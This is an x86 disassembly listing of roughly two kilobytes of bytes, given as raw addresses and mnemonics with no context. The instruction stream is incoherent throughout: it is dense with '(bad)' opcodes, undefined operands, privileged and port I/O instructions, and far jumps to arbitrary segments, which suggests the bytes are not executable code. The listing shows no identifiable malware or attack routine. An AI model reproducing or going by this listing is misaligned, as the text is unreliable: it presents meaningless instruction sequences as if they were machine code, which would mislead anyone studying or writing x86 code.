  5380d4:	cmp    BYTE PTR [eax-0x6ef28ff4],ah
  5380da:	push   0xff5d10ed
  5380df:	scas   eax,DWORD PTR es:[edi]
  5380e0:	jo     0x5380c6
  5380e2:	jg     0x538064
  5380e4:	hlt    
  5380e5:	push   0xaa8e38f7
  5380ea:	xchg   ebx,eax
  5380eb:	dec    eax
  5380ec:	add    DWORD PTR [edi],ebx
  5380ee:	pop    esi
  5380ef:	mov    ebp,0xe8abe22d
  5380f4:	sbb    esi,DWORD PTR ds:0x28bc007d
  5380fa:	call   FWORD PTR [ecx+ebp*4+0x770fa298]
  538101:	adc    DWORD PTR [ebp+0x52216069],ebp
  538107:	arpl   WORD PTR [ecx],si
  538109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53810a:	xchg   ebp,eax
  53810b:	dec    ecx
  53810c:	sahf   
  53810d:	adc    DWORD PTR [esi],ebp
  53810f:	mov    eax,0xf3fc9a3f
  538114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538115:	or     eax,DWORD PTR [esi+0x69ce6d22]
  53811b:	std    
  53811c:	or     DWORD PTR [eax+0x68],eax
  53811f:	xchg   edx,eax
  538120:	or     al,0xc1
  538122:	pop    eax
  538123:	das    
  538124:	inc    DWORD PTR [ebx-0x30]
  538127:	dec    esp
  538128:	jp     0x5380f7
  53812a:	push   ebp
  53812b:	popf   
  53812c:	inc    eax
  53812d:	mov    esi,0x47c1cf71
  538132:	ficom  DWORD PTR [esp+eiz*2]
  538135:	dec    eax
  538136:	test   ebp,0x456f3b9
  53813c:	pop    edi
  53813d:	xor    eax,0x34c9c672
  538142:	jecxz  0x538120
  538144:	ins    BYTE PTR es:[edi],dx
  538145:	out    dx,eax
  538146:	ret    0x2abf
  538149:	out    0x81,al
  53814b:	mov    eax,0xeec989b4
  538150:	pop    ds
  538151:	and    al,bh
  538153:	int3   
  538154:	fs dec sp
  538157:	jnp    0x53814e
  538159:	arpl   WORD PTR [ebx+0x4d839817],bx
  53815f:	popf   
  538160:	loope  0x538110
  538162:	cmp    dh,al
  538164:	inc    esp
  538165:	adc    ebp,ebp
  538167:	fst    QWORD PTR [esi-0x68]
  53816a:	jg     0x53818d
  53816c:	mov    DWORD PTR ds:0x579746cd,ecx
  538172:	sar    DWORD PTR [ecx+0x4a8170ab],cl
  538178:	iret   
  538179:	add    eax,0x19b4d7fb
  53817e:	xchg   ecx,eax
  53817f:	xor    eax,0x2f5103ec
  538184:	jb     0x538142
  538186:	xchg   bh,dh
  538188:	(bad)  
  538189:	fmul   DWORD PTR [edx+0x3c03f5ea]
  53818f:	imul   ebx,DWORD PTR [esi],0x2ba67fe7
  538195:	rcr    dh,cl
  538197:	popf   
  538198:	pop    esp
  538199:	mov    BYTE PTR [eax-0x717673aa],cl
  53819f:	jns    0x538124
  5381a1:	je     0x5381b2
  5381a3:	lahf   
  5381a4:	out    dx,al
  5381a5:	test   bl,bl
  5381a7:	into   
  5381a8:	test   DWORD PTR [ecx],esp
  5381aa:	adc    eax,0x3f4df9b9
  5381af:	cdq    
  5381b0:	and    BYTE PTR [eax-0x17e36ab4],ch
  5381b6:	inc    ebp
  5381b7:	mov    WORD PTR [ecx+0x1c93e6],es
  5381bd:	adc    BYTE PTR [ecx+0x50],bh
  5381c0:	popf   
  5381c1:	push   ebx
  5381c2:	rol    DWORD PTR [ecx-0x188cce7b],0x3c
  5381c9:	lea    eax,[edx+0x7d1ef569]
  5381cf:	jnp    0x538180
  5381d1:	dec    esi
  5381d2:	pop    eax
  5381d3:	dec    esi
  5381d4:	dec    ebp
  5381d5:	in     eax,dx
  5381d6:	or     DWORD PTR [esi-0xb],ebp
  5381d9:	mov    al,ds:0xe722f651
  5381de:	loopne 0x5381a6
  5381e0:	(bad)  
  5381e1:	mov    ecx,0x9f5976a8
  5381e6:	inc    BYTE PTR [ebp+0x54a31e20]
  5381ec:	jb     0x5381e5
  5381ee:	mov    ?,WORD PTR [ecx]
  5381f0:	mov    dh,0x8
  5381f2:	or     al,0xe9
  5381f4:	or     al,0xb3
  5381f6:	inc    ebp
  5381f7:	mov    WORD PTR [edi+0x6a],?
  5381fa:	and    DWORD PTR [edx+ebp*8],ebp
  5381fd:	das    
  5381fe:	stc    
  5381ff:	mov    dl,0x78
  538201:	loopne 0x538211
  538203:	out    dx,eax
  538204:	inc    ebx
  538205:	js     0x538253
  538207:	or     BYTE PTR [edi],bl
  538209:	mov    edx,0x2c532489
  53820e:	leave  
  53820f:	mov    ecx,0x2355d8cf
  538214:	je     0x538239
  538216:	sbb    dl,BYTE PTR [ebx+eax*8-0x66]
  53821a:	ficomp DWORD PTR gs:[edx-0xf]
  53821e:	push   es
  53821f:	lds    edx,FWORD PTR [bx+si+0x74]
  538223:	push   0xffffffc1
  538225:	or     eax,0x7da6b288
  53822a:	push   esi
  53822b:	add    edx,edi
  53822d:	push   esp
  53822e:	adc    cl,BYTE PTR [esi-0x73]
  538231:	add    al,0x16
  538233:	add    ah,BYTE PTR [ecx-0x349c41e4]
  538239:	push   esi
  53823a:	pop    eax
  53823b:	mov    esp,0xd1acd7b7
  538240:	test   ebp,eax
  538242:	push   ecx
  538243:	rol    DWORD PTR [ebp+0xdb88ef6],0x88
  53824a:	sahf   
  53824b:	jp     0x538241
  53824d:	mov    ebx,0xab97dbd0
  538252:	mov    bl,0x11
  538254:	and    al,0x26
  538256:	ror    eax,1
  538258:	jmp    0x2f2c:0x44e71ab2
  53825f:	retf   
  538260:	pop    edx
  538261:	cmc    
  538262:	pusha  
  538263:	in     eax,0x22
  538265:	mov    esp,DWORD PTR [ecx+eax*2-0x1c]
  538269:	cdq    
  53826a:	mov    ch,0x79
  53826c:	pop    esi
  53826d:	(bad)  
  53826e:	push   ebx
  53826f:	loope  0x538267
  538271:	popf   
  538272:	xchg   edi,eax
  538273:	jp     0x5382a2
  538275:	sub    eax,0x16cf6cf8
  53827a:	or     DWORD PTR [esi+edi*1],ebx
  53827d:	cmp    ebx,DWORD PTR [esi+0x7c9b65f4]
  538283:	cwde   
  538284:	cmp    ebx,DWORD PTR ds:0xa2f4046c
  53828a:	mov    al,0x56
  53828c:	test   al,bl
  53828e:	jns    0x538272
  538290:	in     al,dx
  538291:	loopne 0x53822b
  538293:	dec    eax
  538294:	ror    BYTE PTR ds:0x4b56159,0x7
  53829b:	lock (bad) 
  53829e:	loopne 0x538263
  5382a0:	adc    al,0xf1
  5382a2:	call   0x5bdc156b
  5382a7:	lea    ebp,ds:0xa59c61
  5382ad:	and    cl,BYTE PTR [ebx]
  5382af:	jno    0x538241
  5382b1:	addr16 mov eax,ds:0x4770
  5382b5:	out    dx,al
  5382b6:	ror    DWORD PTR [ecx],1
  5382b8:	call   0x5d69:0x2ad82bec
  5382bf:	bswap  ebp
  5382c1:	hlt    
  5382c2:	lahf   
  5382c3:	dec    eax
  5382c4:	mov    bl,0x13
  5382c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5382c7:	mov    ss,WORD PTR [edx+0x385ddfe0]
  5382cd:	(bad)  
  5382ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5382cf:	hlt    
  5382d0:	mov    al,0x9b
  5382d2:	ja     0x538259
  5382d4:	es mov cl,0xa8
  5382d7:	enter  0xcbc5,0xd3
  5382db:	mov    ds:0x2221227e,al
  5382e0:	test   ebx,esp
  5382e2:	rcr    DWORD PTR [esi+eax*2+0x2d3ea3ce],1
  5382e9:	push   edi
  5382ea:	mov    ch,0xca
  5382ec:	mov    bh,0x79
  5382ee:	cmp    eax,eax
  5382f0:	adc    ebx,DWORD PTR [eax]
  5382f2:	dec    ebx
  5382f3:	jb     0x538348
  5382f5:	jmp    0x1dac810
  5382fa:	dec    ebp
  5382fb:	rol    BYTE PTR [esi],0xdd
  5382fe:	jl     0x538304
  538300:	scas   eax,DWORD PTR es:[edi]
  538301:	(bad)  
  538302:	icebp  
  538303:	bound  ebp,QWORD PTR [edx-0x11d7fc89]
  538309:	mov    ds:0x9229038e,eax
  53830e:	jp     0x538354
  538310:	loope  0x538334
  538312:	ds retf 
  538314:	rol    DWORD PTR [ebx-0x43],cl
  538317:	fdiv   QWORD PTR ds:0x6897c219
  53831d:	je     0x53831c
  53831f:	fstp   DWORD PTR [eax+0x2d]
  538322:	jo     0x53830c
  538324:	pop    eax
  538325:	inc    eax
  538326:	and    BYTE PTR [ecx-0x62298da2],bl
  53832c:	aad    0x9e
  53832e:	push   0xffffffda
  538330:	or     eax,0xd2be404
  538335:	rcl    esp,1
  538337:	mov    WORD PTR ds:0x473f332d,ds
  53833d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53833e:	into   
  53833f:	lahf   
  538340:	adc    bl,dh
  538342:	xchg   esi,eax
  538343:	sub    eax,0x6346d995
  538348:	scas   al,BYTE PTR es:[edi]
  538349:	imul   ebp,DWORD PTR [esi+eax*8],0x7
  53834d:	and    edi,edx
  53834f:	mov    esi,0x8080688d
  538354:	rol    cl,0x4d
  538357:	mov    ch,0xb3
  538359:	mov    bl,0x2d
  53835b:	aaa    
  53835c:	sbb    eax,0xc0e6c440
  538361:	iret   
  538362:	inc    edi
  538363:	mov    edi,DWORD PTR [edx-0x5a]
  538366:	es scas al,BYTE PTR es:[edi]
  538368:	sbb    edi,ecx
  53836a:	icebp  
  53836b:	mov    WORD PTR [ecx+0x57e4810a],cs
  538371:	inc    esp
  538372:	imul   ebp,DWORD PTR [esi-0x4bc3ef83],0x117e3285
  53837c:	out    0x6b,al
  53837e:	mov    ecx,0x3c845fb1
  538383:	shl    BYTE PTR [edi+0x6a],cl
  538386:	add    eax,0xa64737bc
  53838b:	adc    BYTE PTR [ebx+0x769362bd],0xc9
  538392:	pusha  
  538393:	popf   
  538394:	push   esp
  538395:	xlat   BYTE PTR ds:[ebx]
  538396:	or     edi,DWORD PTR [ebp-0x22c84ccd]
  53839c:	cmp    eax,0x7aaa451c
  5383a1:	jp     0x53839f
  5383a3:	lahf   
  5383a4:	and    eax,0x539c67d7
  5383a9:	fnsave [ecx-0x703b888f]
  5383af:	and    al,0xf1
  5383b1:	jecxz  0x538377
  5383b3:	pop    edx
  5383b4:	mov    eax,ds:0x3b6bffcf
  5383b9:	ja     0x53835e
  5383bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5383bc:	add    al,0xa6
  5383be:	cmp    ebx,ebp
  5383c0:	ss jnp 0x538440
  5383c3:	mov    esp,0xf4618702
  5383c8:	sbb    eax,0xe31ac5cc
  5383cd:	adc    DWORD PTR [ecx+ebx*2],ebx
  5383d0:	xchg   ebp,eax
  5383d1:	loop   0x5383de
  5383d3:	cmp    BYTE PTR [esi+0x9cb8767],dl
  5383d9:	mov    ecx,0xf86a0f77
  5383de:	mov    ah,BYTE PTR [ebp+0x40]
  5383e1:	leave  
  5383e2:	dec    edi
  5383e3:	gs fmul st,st(3)
  5383e6:	mov    ebp,0xf6b2f82
  5383eb:	sbb    eax,0x87985fcc
  5383f0:	in     al,0x30
  5383f2:	or     BYTE PTR [eax-0x10],bh
  5383f5:	scas   eax,DWORD PTR es:[edi]
  5383f6:	add    DWORD PTR [eax-0x76],esp
  5383f9:	fistp  DWORD PTR [edx]
  5383fb:	mov    ch,dh
  5383fd:	mov    eax,0xedab637f
  538402:	mov    bl,0xfb
  538404:	push   esi
  538405:	inc    edx
  538406:	imul   eax,DWORD PTR [ecx+0x6f8387b2],0x5d
  53840d:	inc    edx
  53840f:	xor    DWORD PTR es:[ecx-0x30],ebp
  538413:	loop   0x53848d
  538415:	stos   BYTE PTR es:[edi],al
  538416:	lods   al,BYTE PTR ds:[esi]
  538417:	imul   edx,eax,0x95bd0dec
  53841d:	add    ebx,eax
  53841f:	sub    DWORD PTR [eax+eiz*2],edx
  538422:	sbb    edx,DWORD PTR [edx+0x7]
  538425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538426:	push   0x65ff5af3
  53842b:	pop    esp
  53842c:	cmp    eax,0x4354a7e9
  538431:	mov    eax,ds:0x275ce9a8
  538436:	jo     0x538433
  538438:	fsub   DWORD PTR [ecx+edx*4+0x26]
  53843c:	mov    eax,DWORD PTR [esi-0x652ab1c6]
  538442:	mov    eax,0x6cc0d7f8
  538447:	cmp    DWORD PTR [ecx-0x43],esi
  53844a:	out    dx,al
  53844b:	out    0x81,eax
  53844d:	cdq    
  53844e:	push   ebp
  53844f:	cmp    ebp,ecx
  538451:	push   ecx
  538452:	retf   
  538453:	mov    dh,0x3a
  538455:	bound  ecx,QWORD PTR [eax-0x55]
  538458:	jmp    0x83c7:0xdc40be80
  53845f:	push   edx
  538460:	stos   BYTE PTR es:[edi],al
  538461:	mov    dh,0x0
  538463:	cld    
  538464:	lock loop 0x538401
  538467:	sbb    ecx,DWORD PTR [eax-0x38eb6d5c]
  53846d:	iret   
  53846e:	fcmovne st,st(1)
  538470:	arpl   WORD PTR ds:[esi],sp
  538473:	mov    dh,0xe0
  538475:	cli    
  538476:	(bad)  
  538477:	sti    
  538478:	xchg   edx,eax
  538479:	xchg   esp,eax
  53847a:	in     eax,dx
  53847b:	fisttp WORD PTR [edx+0x2a]
  53847e:	mov    WORD PTR [esi],gs
  538480:	mov    esi,0xd2c6db41
  538485:	push   ebp
  538486:	jge    0x538468
  538488:	lds    ebp,FWORD PTR [esi]
  53848a:	xor    eax,0x32750cff
  53848f:	into   
  538490:	dec    eax
  538491:	outs   dx,BYTE PTR ds:[esi]
  538492:	dec    esp
  538493:	jae    0x53849b
  538495:	setle  al
  538498:	push   es
  538499:	fwait
  53849a:	jnp    0x5384b2
  53849c:	sbb    al,0xc5
  53849e:	add    eax,0x63ca662a
  5384a3:	pop    eax
  5384a4:	pop    esp
  5384a5:	fcmove st,st(5)
  5384a7:	fild   DWORD PTR [edx-0x23373f77]
  5384ad:	sti    
  5384ae:	jmp    0x538490
  5384b0:	dec    edx
  5384b1:	hlt    
  5384b2:	mov    ebp,0x40122e9a
  5384b7:	sub    cl,BYTE PTR [edx+0x2a]
  5384ba:	jae    0x5384ec
  5384bc:	or     ebp,ebx
  5384be:	cmp    dl,al
  5384c0:	shr    DWORD PTR [edi],0x96
  5384c3:	sub    dh,ch
  5384c5:	mov    ebx,0x31a99a5
  5384ca:	ins    DWORD PTR es:[edi],dx
  5384cb:	lahf   
  5384cc:	ja     0x53849b
  5384ce:	ins    DWORD PTR es:[edi],dx
  5384cf:	xchg   esp,eax
  5384d0:	sbb    al,0xe6
  5384d2:	dec    esi
  5384d3:	shl    bl,0x44
  5384d6:	sbb    BYTE PTR [ecx-0x5444365e],bh
  5384dc:	mov    BYTE PTR [edi+0x45],bh
  5384df:	cdq    
  5384e0:	ss inc ebx
  5384e2:	fwait
  5384e3:	dec    edi
  5384e4:	jmp    FWORD PTR [edi+0x2e]
  5384e7:	pusha  
  5384e8:	add    DWORD PTR [ecx-0x6],0x31
  5384ec:	loope  0x5384cd
  5384ee:	cdq    
  5384ef:	cld    
  5384f0:	mov    ch,0x87
  5384f2:	mov    al,0xf3
  5384f4:	cli    
  5384f5:	imul   ecx,eax,0x60
  5384f8:	in     al,dx
  5384f9:	jg     0x53856a
  5384fb:	mov    DWORD PTR [ecx],eax
  5384fd:	jb     0x5384c8
  5384ff:	add    al,0x3a
  538501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538502:	cmp    BYTE PTR [eax-0x3c8418fe],bl
  538508:	xor    eax,0x3493ab36
  53850d:	icebp  
  53850e:	out    0xc1,al
  538510:	adc    DWORD PTR [esi+0x6a],edi
  538513:	cs fwait
  538515:	out    dx,al
  538516:	jns    0x53853b
  538518:	jns    0x5384b6
  53851a:	cli    
  53851b:	jmp    0xc3e99c88
  538520:	push   ss
  538521:	add    DWORD PTR [ebp+0x4c],esp
  538524:	mov    al,ds:0xd8119c79
  538529:	out    0x3a,eax
  53852b:	outs   dx,DWORD PTR ds:[esi]
  53852c:	mov    ebx,edi
  53852e:	test   ebp,edx
  538530:	call   0xc565:0x8278168b
  538537:	xchg   dl,dh
  538539:	or     al,0x1b
  53853b:	icebp  
  53853c:	in     eax,0x82
  53853e:	test   al,0x9b
  538540:	mov    dl,0xb7
  538542:	xchg   edx,eax
  538543:	jbe    0x5384cf
  538545:	lods   eax,DWORD PTR ds:[esi]
  538546:	es xor eax,0xd3c0047
  53854c:	adc    eax,0xfabf0679
  538551:	hlt    
  538552:	pusha  
  538553:	sbb    ebx,esp
  538555:	xor    esp,DWORD PTR [ebp+ebp*1-0x52]
  538559:	repz loope 0x5385b0
  53855c:	js     0x5384fe
  53855e:	and    BYTE PTR [edx+ebx*4-0x27915d81],0x17
  538566:	push   cs
  538567:	mov    esp,0x5a28f237
  53856c:	mov    dh,0xec
  53856e:	cmp    eax,0x53ab1182
  538573:	xor    DWORD PTR [ecx],ecx
  538575:	dec    edx
  538576:	mov    dh,0x55
  538578:	xchg   edx,eax
  538579:	or     eax,0x7eb7100d
  53857e:	out    0x66,al
  538580:	lods   eax,DWORD PTR ds:[esi]
  538581:	mov    ah,BYTE PTR [ecx+0x4e]
  538584:	push   ebp
  538585:	in     eax,dx
  538586:	pop    edx
  538587:	jg     0x5385ee
  538589:	das    
  53858a:	in     eax,0x15
  53858c:	pusha  
  53858d:	mov    ebp,DWORD PTR [edx+edx*4-0x1842d66b]
  538594:	outs   dx,BYTE PTR ds:[esi]
  538595:	div    BYTE PTR [edx+0x6a]
  538598:	enter  0xfe0a,0xdc
  53859c:	popa   
  53859d:	xchg   edi,eax
  53859e:	outs   dx,DWORD PTR ds:[esi]
  53859f:	or     eax,0xf37a6ed0
  5385a4:	pop    es
  5385a5:	add    DWORD PTR es:[ebx+0x76396d77],ecx
  5385ac:	push   cs
  5385ad:	cmp    BYTE PTR [ecx],cl
  5385af:	lds    ebx,FWORD PTR [esi-0x3c]
  5385b2:	in     al,dx
  5385b3:	mov    DWORD PTR [ebp+0xf538e4e],esp
  5385b9:	and    DWORD PTR [ebp+0x1fc27040],0xffffff8a
  5385c0:	dec    edi
  5385c1:	out    dx,al
  5385c2:	sbb    dl,bl
  5385c4:	xor    esi,DWORD PTR [eax+ebx*4+0x63c98015]
  5385cb:	cmp    DWORD PTR [ecx+0x38910ca8],ebx
  5385d1:	dec    esp
  5385d2:	mov    ah,0x93
  5385d4:	or     BYTE PTR [ebp-0x500a6ae3],al
  5385da:	add    DWORD PTR [ecx-0x17],ebx
  5385dd:	retf   
  5385de:	mov    ebp,0xd533aa2b
  5385e3:	sti    
  5385e4:	outs   dx,DWORD PTR ds:[esi]
  5385e5:	sub    dh,BYTE PTR [ebp+0x7c]
  5385e8:	pop    ecx
  5385e9:	vpsrlw ymm5,ymm3,XMMWORD PTR [esi-0x54f04e75]
  5385f1:	jle    0x538631
  5385f3:	rcr    ah,cl
  5385f5:	popf   
  5385f6:	std    
  5385f7:	cmp    DWORD PTR [edi],0xeeb05e5f
  5385fd:	imul   esi,DWORD PTR [ebx+0xd],0x47cf6a7
  538604:	add    BYTE PTR [ebx+0x57],dh
  538607:	lds    esi,FWORD PTR [edx+0x4fd80f11]
  53860d:	and    DWORD PTR ds:0xb0a7f2e6,edx
  538613:	pop    es
  538614:	add    DWORD PTR [edx],eax
  538616:	in     al,0xbe
  538618:	aad    0x57
  53861a:	jle    0xbcb39891
  538620:	xor    eax,0x5694811d
  538625:	jge    0x5385a9
  538627:	test   DWORD PTR [edi],esp
  538629:	mov    ecx,0xa32d7fae
  53862e:	xlat   BYTE PTR ds:[ebx]
  53862f:	outs   dx,BYTE PTR ds:[esi]
  538630:	out    dx,eax
  538631:	mov    dh,0x9
  538633:	cdq    
  538634:	(bad)  
  538635:	test   eax,0x2c1c7da6
  53863a:	stc    
  53863b:	shl    eax,0xb7
  53863e:	push   ebp
  53863f:	aad    0xe6
  538641:	(bad)  
  538642:	stos   BYTE PTR es:[edi],al
  538643:	or     BYTE PTR [edi-0x44],bh
  538646:	inc    edi
  538647:	mov    cl,0x41
  538649:	cdq    
  53864a:	rcl    DWORD PTR [ecx],cl
  53864c:	jbe    0x538651
  53864e:	hlt    
  53864f:	push   0x84721fc5
  538654:	push   0xffffffd6
  538656:	pop    esp
  538657:	or     edx,DWORD PTR [edx]
  538659:	jmp    0x5386d8
  53865b:	xchg   edx,eax
  53865c:	adc    al,0x12
  53865e:	ins    BYTE PTR es:[edi],dx
  53865f:	out    dx,eax
  538660:	iret   
  538661:	or     al,BYTE PTR [edi+0x18]
  538664:	sub    ebx,DWORD PTR [ecx+ebp*8]
  538667:	out    0xc8,eax
  538669:	leave  
  53866a:	push   0xaebe39a
  53866f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  538670:	or     al,ah
  538672:	mov    bh,0x7f
  538674:	push   ecx
  538675:	vmread DWORD PTR [edx+0x24],esi
  538679:	jo     0x5386e7
  53867b:	inc    eax
  53867c:	in     al,dx
  53867d:	mov    esi,0xdd7c9e5a
  538682:	xlat   BYTE PTR ds:[ebx]
  538683:	mov    eax,0x4dddc4fd
  538688:	mov    ?,WORD PTR [esi]
  53868a:	in     al,0xeb
  53868c:	sub    BYTE PTR [edx+0x20b99e4d],bh
  538692:	aaa    
  538693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538694:	outs   dx,DWORD PTR ds:[esi]
  538695:	cdq    
  538696:	hlt    
  538697:	sub    al,0xed
  538699:	addr16 mov bh,0xb6
  53869c:	push   es
  53869d:	ja     0x538654
  53869f:	mov    dh,0xc8
  5386a1:	sbb    BYTE PTR gs:[edx+0x33a03e48],dh
  5386a8:	shr    BYTE PTR [edx+0x37],cl
  5386ab:	pop    edx
  5386ac:	push   ss
  5386ad:	pop    ebp
  5386ae:	or     BYTE PTR [ecx-0x5c],bh
  5386b1:	xchg   edi,eax
  5386b2:	popf   
  5386b3:	out    dx,eax
  5386b4:	and    eax,DWORD PTR [eax+0x38]
  5386b7:	(bad)
  5386ba:	in     al,0x26
  5386bc:	dec    edi
  5386bd:	xchg   ebp,eax
  5386be:	pop    ds
  5386bf:	mov    ebx,0x458b10cd
  5386c4:	and    al,0xf2
  5386c6:	xchg   edx,eax
  5386c7:	inc    ecx
  5386c8:	add    bh,BYTE PTR [edi-0x3bf30b24]
  5386ce:	in     eax,0xce
  5386d0:	test   al,0x12
  5386d2:	sahf   
  5386d3:	shl    DWORD PTR [esi+edi*2-0x7c77ac06],cl
  5386da:	sahf   
  5386db:	cmp    DWORD PTR [edi-0x1907c4b0],eax
  5386e1:	out    0x7e,eax
  5386e3:	jg     0x538733
  5386e5:	adc    al,dh
  5386e7:	mov    WORD PTR [ecx-0x5d],ds
  5386ea:	addr16 add al,0x4a
  5386ed:	sub    DWORD PTR [edi+0x58],esi
  5386f0:	inc    ecx
  5386f1:	stos   BYTE PTR es:[edi],al
  5386f2:	add    al,0x61
  5386f4:	out    dx,al
  5386f5:	sub    eax,0x9e430ae0
  5386fa:	or     DWORD PTR [edi-0x1],ebx
  5386fd:	sbb    DWORD PTR [ebp+0x0],ecx
  538700:	adc    al,0x96
  538702:	int    0xc0
  538704:	fldl2e 
  538706:	mov    ebx,0xcd891244
  53870b:	das    
  53870c:	jp     0x53868f
  53870e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53870f:	sbb    eax,0x78b93af6
  538714:	jle    0x53873a
  538716:	jmp    0x5d15:0xfadd5e09
  53871d:	push   edx
  53871e:	mov    bh,0x22
  538720:	mov    edi,0x84303485
  538725:	dec    esp
  538726:	(bad)  
  538727:	mov    ecx,0x12d97e66
  53872c:	add    al,0x90
  53872e:	loop   0x5386f7
  538730:	fimul  DWORD PTR [ebx]
  538732:	adc    edi,DWORD PTR [eax+0x68c8caae]
  538738:	fbld   TBYTE PTR [ebp+0x27088a9a]
  53873e:	xchg   ebx,eax
  53873f:	icebp  
  538740:	cmp    eax,0x9ad8c199
  538745:	rcr    eax,0xc4
  538748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538749:	nop
  53874a:	imul   esi,DWORD PTR [ebp+0x4c091cdd],0xc751f75c
  538754:	inc    edi
  538755:	aaa    
  538756:	imul   esi,DWORD PTR [eax+0x2c73d351],0xacf5c781
  538760:	sbb    eax,0xc4c68913
  538765:	add    ah,BYTE PTR [edi+esi*4-0x32]
  538769:	(bad)  
  53876a:	mov    eax,0xdbe40428
  53876f:	aas    
  538770:	loopne 0x53875f
  538772:	fmul   DWORD PTR [edi+0x9]
  538775:	or     eax,0x362d483b
  53877a:	scas   al,BYTE PTR es:[edi]
  53877b:	dec    edi
  53877c:	les    edx,FWORD PTR [esi-0x68927a8e]
  538782:	iret   
  538783:	adc    dh,al
  538785:	rol    al,0x94
  538788:	cmp    ah,al
  53878a:	out    dx,eax
  53878b:	xor    DWORD PTR [ebp+0x3a83b1f9],ecx
  538791:	aaa    
  538792:	mov    BYTE PTR [eax],dh
  538794:	into   
  538795:	test   DWORD PTR [edx-0x7f],ecx
  538798:	icebp  
  538799:	xor    edx,ecx
  53879b:	sub    BYTE PTR [esi+0x78c76707],0x53
  5387a2:	aam    0xa2
  5387a4:	(bad)  
  5387a5:	std    
  5387a6:	push   es
  5387a7:	jge    0x5387f6
  5387a9:	out    0x92,al
  5387ab:	test   eax,0x90e90ff3
  5387b0:	lock dec ebx
  5387b2:	xor    BYTE PTR [ecx*2+0x26d47ff2],0x12
  5387ba:	les    edx,FWORD PTR [ecx]
  5387bc:	addr16 dec edx
  5387be:	jnp    0x538808
  5387c0:	repnz pop DWORD PTR [ebx+0x3d]
  5387c4:	ror    DWORD PTR [ebp-0x2e],1
  5387c7:	xchg   ebx,eax
  5387c8:	inc    edx
  5387c9:	mov    dl,0xa2
  5387cb:	xchg   BYTE PTR [ebp+0x79],ah
  5387ce:	push   es
  5387cf:	and    dh,BYTE PTR [eax]
  5387d1:	js     0x53883a
  5387d3:	in     al,0xa5
  5387d5:	mov    BYTE PTR [ecx],cl
  5387d7:	std    
  5387d8:	out    dx,al
  5387d9:	mov    eax,0x7c941b2b
  5387de:	out    dx,eax
  5387df:	fistp  WORD PTR [edx-0x4]
  5387e2:	rol    BYTE PTR [ebp+0x1e82a8e5],0xa2
  5387e9:	dec    ebp
  5387ea:	sbb    al,BYTE PTR [ecx]
  5387ec:	push   esp
  5387ed:	jle    0x538790
  5387ef:	fnstcw WORD PTR [edx]
  5387f1:	inc    edi
  5387f2:	(bad)
  5387f5:	cmc    
  5387f6:	mov    ds:0xd651b651,eax
  5387fb:	adc    cl,BYTE PTR [ecx]
  5387fd:	mov    eax,ds:0x53bb6c45
  538802:	(bad)  
  538804:	dec    ebx
  538805:	and    eax,0xcbb36005
  53880a:	mov    al,0xaa
  53880c:	test   cl,bh
  53880e:	add    al,0xe
  538810:	xor    al,0xaf
  538812:	inc    ecx
  538813:	sbb    eax,0x103f22af
  538818:	int3   
  538819:	daa    
  53881a:	push   eax
  53881b:	dec    eax
  53881c:	adc    ecx,esp
  53881e:	jle    0x53883e
  538820:	aaa    
  538821:	cs fs dec ecx
  538824:	mov    al,0x8e
  538826:	ss leave 
  538828:	or     al,0xb7
  53882a:	sub    ah,BYTE PTR [eax+0xd]
  53882d:	mov    bh,0x78
  53882f:	mov    al,0x37
  538831:	and    ecx,DWORD PTR [eax+eiz*1-0x7d9624e3]
  538838:	mov    BYTE PTR [ecx-0x44],bh
  53883b:	inc    edx
  53883c:	pop    ebp
  53883d:	in     al,0x5f
  53883f:	and    eax,0x766a18e1
  538844:	adc    eax,0x973254b
  538849:	or     DWORD PTR [esp+eax*4-0x3de3300b],esi
  538850:	inc    esp
  538851:	cli    
  538852:	jge    0x5388b7
  538854:	lds    ecx,FWORD PTR [ecx-0x4ac27e01]
  53885a:	xchg   ecx,eax
  53885b:	cwde   
  53885c:	and    DWORD PTR [eax+0x77a64ddd],esi
  538862:	jp     0x5388b6
  538864:	or     BYTE PTR [ebx+0x79],bh
  538867:	sbb    DWORD PTR [ebp+0x10],ecx
  53886a:	sbb    edi,DWORD PTR [esi+0x5a0d8dfa]
  538870:	push   ecx
  538871:	aam    0xf8
  538873:	out    0x8a,al
  538875:	mov    ebp,0x1b82275a
  53887a:	test   BYTE PTR [edx],ah
  53887c:	push   ebx
  53887d:	xlat   BYTE PTR ds:[ebx]
  53887e:	inc    edi
  53887f:	jge    0x5388b5
  538881:	pusha  
  538882:	inc    edi
  538883:	fbstp  TBYTE PTR [edx]
  538885:	retf   
  538886:	rcr    esi,cl
  538888:	out    0xee,eax
  53888a:	(bad)  
  53888b:	lock jmp DWORD PTR [eax+eiz*2-0x3f]
  538890:	mov    dh,0xaa
  538892:	fadd   QWORD PTR [edx+0x45]
  538895:	xlat   BYTE PTR ds:[ebx]
  538896:	pushf  
  538897:	cwde   
  538898:	pop    ds
  538899:	cwde   
  53889a:	out    0xf6,al
  53889c:	add    ah,bh
  53889e:	add    eax,0x4ffe68be
  5388a3:	fisub  WORD PTR [eax]
  5388a5:	xchg   ebx,eax
  5388a6:	push   edx
  5388a7:	sbb    esp,DWORD PTR es:[ecx-0xc]
  5388ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5388ac:	and    al,0xf9
  5388ae:	shl    bl,1
  5388b0:	popa   
  5388b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5388b2:	push   edx
  5388b3:	and    ch,ch
  5388b5:	aad    0x44
  5388b7:	push   es
  5388b8:	out    0x3d,eax
  5388ba:	rcr    BYTE PTR [esi+0x1f],0x3d
  5388be:	call   0xd12f:0xfe0d4cc3
  5388c5:	and    esi,DWORD PTR [edx-0x3987607d]
  5388cb:	pop    eax
  5388cc:	imul   esp,DWORD PTR [eax+0x26a41d0a],0xfffffff1
